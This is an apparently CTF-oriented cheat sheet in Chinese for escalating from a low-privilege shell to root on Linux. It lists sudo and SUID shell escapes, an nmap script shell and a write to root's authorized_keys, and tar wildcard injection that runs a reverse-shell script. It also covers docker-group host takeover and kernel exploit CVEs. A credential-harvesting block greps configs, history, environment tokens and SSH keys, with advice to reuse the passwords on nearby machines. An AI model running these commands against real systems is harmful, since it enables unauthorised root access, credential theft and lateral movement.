# Linux 提权（拿到低权 shell 后）

> 顺序：**自动化脚本先跑**（LinPEAS / linux-exploit-suggester / pspy），人工按下面清单过。5 分钟一个姿势，不通换下一个。

## 一键姿势

- 传 `LinPEAS`（peass-ng 仓库）跑一遍，输出高亮点直接对着打
- `uname -r` 拿内核版本 → `linux-exploit-suggester` 出编号清单
- `pspy` 挂后台看有没有 root 定时任务/进程跑（无需 root 也能看命令行）

## sudo

- `sudo -l`：能免密跑什么，去 GTFOBins 查（https://gtfobins.github.io）：
  - `sudo vim` → `:!/bin/sh`；`sudo awk` → `awk 'BEGIN{system("/bin/sh")}'`
  - `sudo find` → `find . -exec /bin/sh \;`；`sudo python` → `import os; os.system("/bin/sh")`
  - `sudo less/more/man` → `!/bin/sh`；`sudo cp` 直接盖 `/etc/passwd` 或 `/etc/shadow`
  - `sudo env` → `env /bin/sh`；`sudo ftp` → `!/bin/sh`
  - **★ `sudo NOPASSWD: /bin/su`（hbc 靶场 293「最简单的提权」实测，Web→root 一条命令）**：
    ```bash
    sudo -n /bin/su -c 'id'          # uid=0(root) gid=0(root) groups=0(root)
    sudo -n /bin/su -c 'cat /root/flag.txt'
    ```
    原理：`/bin/su` 本身 `-rwsr-xr-x root root`；`sudo` 已免密授权它，此时 su **不再要 root 密码**，
    `-c` 直接把命令当 root 跑完即退 ⇒ 等价于 NOPASSWD: ALL。
    **识别**：`sudo -l` 输出里出现 `su` / `sh` / `bash` / `login` 这类「本身就是身份切换器」的二进制，
    比任何 GTFOBins 条目都直接 —— **看到就打，别去磨 SUID 清单和内核**。
    本题现场：SUID 只有系统默认九个（chsh/su/umount/mount/chfn/newgrp/gpasswd/passwd/sudo），
    `getcap -r /` 空、`/etc/cron*` 无可写 ⇒ **唯一可利用点就是这一条**，其余全是噪音。
- LD_PRELOAD/LD_LIBRARY_PATH 在 sudo 环境保留时 → 编译恶意 so 劫持
- sudo 版本 < 1.9.5p2：**CVE-2021-3156（Baron Samedit）堆溢出**，公开 EXP 直接打，比赛常客
- `sudo -u#-1` 类负数 uid 绕过（老版本）

## SUID

- 找：`find / -perm -4000 -type f 2>/dev/null`，逐个对 GTFOBins：
  - `find`（-exec）、`bash/sh`、`env`、`vim`、`cp/mv`（盖 passwd）、`python/perl/ruby/node`（-c 直接起 shell）、`awk`、`less`
  - **`nmap` 带 SUID**：⚠ **别再用 `--interactive`**（GTFOBins 官方标注它只存在于 **nmap 2.02–5.21**，现代镜像全无此选项，写了也是白写）。
    正确两条：
    ```bash
    # ① 起 shell（走 Lua 引擎，Inherit → 可读文件 → 执行）
    nmap --script=/tmp/evil.nse 127.0.0.1        # evil.nse 里 os.execute("/bin/sh")
    # ② 本地文件读写（本库原先完全没写的两个点）
    nmap -oG=/root/.ssh/authorized_keys 127.0.0.1   # File write：把扫描结果写入任意文件
    nmap -iL /root/flag.txt 127.0.0.1               # File read：把 target 列表当文件读，报错回显内容
    ```
  - **`passwd` 带 SUID（磐石真题 root 拿法）**：直接 `passwd root` 改 root 密码 → `su root`。看到就打，10 秒的事
  - `base64`/`xxd`（SUID 读任意文件：`base64 /root/flag | base64 -d`）；`tar`/`zip` 通配符劫持见下节
- 自编译 SUID 场景（题目故意给了个奇怪 SUID）：逆向看它调了什么命令 → PATH 劫持换成 `/bin/sh`
- `umask` + SUID 组合题：让 root 帮你写带 x 的文件

## 内核（编号即路标）

| 内核范围 | 漏洞 |
|---------|------|
| ≤4.14.x 一批老内核 | CVE-2016-5195 **Dirty COW**（写只读文件，改 /etc/passwd） |
| 5.8 ≤ 版本 < 5.16.11 / 5.15.25 / 5.10.102 | CVE-2022-0847 **Dirty Pipe**（同样覆写只读文件，比 DirtyCow 稳） |
| 几乎所有装了 polkit 的发行版（2022 前的镜像） | CVE-2021-4034 **PwnKit（pkexec）**：靶场第一优先试，EXP 一发入魂 |
| 5.11-6.3.8 等 | CVE-2023-2640 / CVE-2023-32629 **OverlayFS** |
| 4.14 一代 | CVE-2017-16995 eBPF |
| Ubuntu 14-16 老靶机 | CVE-2017-1000253、CVE-2016-2384 |

- 打法：内核版本丢搜索引擎/EXP 库（`linux-exploit-suggester` 直接给链接），找现成 EXP 编译打。**编译走本机 WSL**（Windows 侧无 gcc）：`wsl -d ghost -- gcc -static exp.c -o exp`，静态编译后再传靶机（glibc 对不上时 `-static` 是保命项）
- 打挂内核会重启靶机：AWD 谨慎，夺旗模式无所谓

## 定时任务 / 服务

- `cat /etc/crontab`、`ls -la /etc/cron.*/`、`crontab -l`：找 root 跑的脚本
- 脚本本身不可写 → 看它调的命令目录可不可写 → **PATH 劫持**（`export PATH=/tmp:$PATH` 放同名恶意命令）
- **通配符注入**：root 执行 `tar cf x.tar /dir/*` 时，在 /dir 放 `--checkpoint=1 --checkpoint-action=exec=sh 反弹.sh` 两个文件名（touch 创建）
- systemd 服务单元可写 → 改 ExecStart 起反弹

## capabilities / 其它

- `getcap -r / 2>/dev/null`：带 `cap_setuid` 的 python/openssl/perl → 一行拿 root
- `id` 看组：**docker 组 → `docker run -v /:/host -it ubuntu chroot /host bash` 直接宿主机 root**（容器逃逸同理：挂载 docker.sock、privileged 容器 `nsenter`）
- lxc 组、disk 组（直接 dd 读盘）、adm 组（读日志捡凭据）都有对应姿势
- NFS `no_root_squash` 导出：攻击机 root 挂载后放 SUID 文件
- `/etc/passwd` 可写 → openssl 生成 hash 追加 root 用户；`/etc/shadow` 可读 → john/hashcat 爆

## 凭据顺手抓（横向的种子）

```bash
cat ~/.bash_history ~/.mysql_history 2>/dev/null
grep -rE 'password|passwd|pwd|secret' /var/www/html --include="*.conf" --include="*.php" --include="*.ini" --include="*.yml" 2>/dev/null | head -50
cat /var/www/html/*/config* /var/www/html/*/*/config* 2>/dev/null
env | grep -iE 'pass|key|token'
ls /home/*/.ssh/ /root/.ssh/ 2>/dev/null
```
抓到的口令直接试同段其它机器 SSH（比赛密码复用率极高）。

## 假点

- `sudo -l` 输出 `(ALL) NOPASSWD: ALL` 都给了却还去磨内核 = 浪费时间
- **`sudo -l` 输出里出现 `su` 时，别当成"没给全权限"而放过去**：`NOPASSWD: /bin/su` 看着只授权了一个
  身份切换器，实际等价于 ALL（su 是 setuid root，被 sudo 免密调用后不再要密码）—— 293 实测一条命令到 root
- **"SUID 清单里没有自定义程序" ≠ 没有提权面**：系统默认 SUID（chsh/su/mount/passwd/sudo…）配合 sudoers、
  capabilities、可写 cron 任一都能打。293 的 SUID 全默认、getcap 空、cron 不可写，唯一可利用点就是 sudoers 那一行
  ⇒ **侦察的判据是"哪一个点可写/可借"合计出来的，不是单看 SUID 清单有没有异常项**
- 提权链二次复现时**换一个验证维度**（`id -u` + `hostname` + 文件 `md5sum`），
  别只重跑同一条 `id` —— 只重跑 `id` 证不了"同一台机器、同一个文件"
- 内核 EXP 打完卡死没回显 → 检查反弹端口通不通、架构对不对（`uname -m`，ARM 靶机用 ARM EXP）
- pkexec 打完没变化 → 看是否已 patch（`ls -la /usr/bin/pkexec` 日期）
- 提权成功的标志是 `whoami` = root，不是 EXP 输出"done"
